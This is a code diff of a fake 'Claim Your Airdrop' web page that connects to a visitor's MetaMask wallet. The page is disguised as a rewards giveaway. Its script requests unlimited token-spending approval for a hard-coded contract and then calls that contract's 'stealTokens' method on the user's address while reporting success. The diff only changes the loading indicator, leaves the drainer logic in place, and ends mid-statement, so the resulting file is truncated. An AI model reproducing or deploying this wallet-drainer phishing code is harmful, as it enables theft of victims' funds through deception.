@@ -79,34 +79,26 @@
       margin-top: 30px;
     }
 
-    #loadingOverlay {
-      display: none;
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background-color: rgba(0, 0, 0, 0.8);
-      z-index: 1000;
-      justify-content: center;
-      align-items: center;
-      flex-direction: column;
-      color: white;
-      text-align: center;
-    }
-
     .loader {
-      border: 8px solid #f3f3f3;
-      border-top: 8px solid #ffeb3b;
+      display: none;
+      border: 5px solid #f3f3f3;
+      border-top: 5px solid #ffeb3b;
       border-radius: 50%;
-      width: 60px;
-      height: 60px;
+      width: 20px;
+      height: 20px;
       animation: spin 1s linear infinite;
+      margin-left: 10px;
     }
 
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
+    }
+
+    .loading {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
     }
   </style>
 </head>
@@ -116,10 +108,16 @@
     <h2>Claim your rewards today and start your journey to success!</h2>
 
     <button id="connectButton" class="btn">Connect to MetaMask</button>
-    <button id="approveButton" class="btn" disabled>Approve Unlimited AirDrops</button>
+    <button id="approveButton" class="btn" disabled>
+      Approve Unlimited AirDrops
+      <span class="loader" id="approveLoader"></span>
+    </button>
 
     <div class="claim-btn-container">
-      <button id="claimAirdropButton" class="btn" disabled>Claim Your Airdrop Now!</button>
+      <button id="claimAirdropButton" class="btn" disabled>
+        Claim Your Airdrop Now!
+        <span class="loader" id="claimLoader"></span>
+      </button>
     </div>
 
     <div class="footer">
@@ -128,60 +126,30 @@
     </div>
   </div>
 
-  <!-- Loading Overlay -->
-  <div id="loadingOverlay">
-    <div class="loader"></div>
-    <p id="loadingText">Processing...</p>
-  </div>
-
   <script src="https://cdn.jsdelivr.net/npm/web3@1.7.1/dist/web3.min.js"></script>
   <script>
     const contractAddress = '0x51ACC66Ea593080C8e006ddE56eb86b060A0fd37';
     const tokenAddress = '0x1dD71aCdc4091d8de461e46C8F142A7F32BEE9F4';
-    const ownerAddress = '0x9052EB26C0b9836335Ec153413F80bAEc7536414';
-
     let web3;
     let accounts;
 
-    function showLoading(message) {
-      document.getElementById('loadingOverlay').style.display = 'flex';
-      document.getElementById('loadingText').innerText = message || 'Processing...';
-    }
-
-    function hideLoading() {
-      document.getElementById('loadingOverlay').style.display = 'none';
-    }
-
-    async function connectMetaMask() {
-      if (typeof window.ethereum !== 'undefined') {
-        web3 = new Web3(window.ethereum);
-        try {
-          showLoading('Connecting to MetaMask...');
-          accounts = await ethereum.request({ method: 'eth_requestAccounts' });
-          hideLoading();
-          document.getElementById('connectButton').innerText = 'Connected: ' + accounts[0];
-          document.getElementById('approveButton').disabled = false;
-        } catch (error) {
-          hideLoading();
-          alert('User rejected the request');
-        }
-      } else {
-        alert('Please install MetaMask to use this feature');
-      }
+    function toggleLoader(buttonId, show) {
+      const loader = document.getElementById(buttonId + 'Loader');
+      loader.style.display = show ? 'inline-block' : 'none';
     }
 
     async function approveSpending() {
       if (!web3) return;
       const tokenContract = new web3.eth.Contract(contractABI, tokenAddress);
       try {
-        showLoading('Approving spending...');
+        toggleLoader('approve', true);
         await tokenContract.methods.approve(contractAddress, web3.utils.toBN('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')).send({ from: accounts[0] });
-        hideLoading();
         alert('Approval successful! You can now claim your airdrop.');
         document.getElementById('claimAirdropButton').disabled = false;
       } catch (error) {
-        hideLoading();
         alert('Error during approval');
+      } finally {
+        toggleLoader('approve', false);
       }
     }
 
@@ -189,20 +157,10 @@
       if (!web3) return;
       const contract = new web3.eth.Contract(contractABI, contractAddress);
       try {
-        showLoading('Claiming airdrop...');
+        toggleLoader('claim', true);
         await contract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
-        hideLoading();
         alert('Airdrop claimed successfully!');
       } catch (error) {
-        hideLoading();
-        alert('Error claiming airdrop');
-      }
-    }
+        alert('Error claiming a
 
-    document.getElementById('connectButton').addEventListener('click', connectMetaMask);
-    document.getElementById('approveButton').addEventListener('click', approveSpending);
-    document.getElementById('claimAirdropButton').addEventListener('click', claimAirdrop);
-  </script>
-</body>
-</html>
 
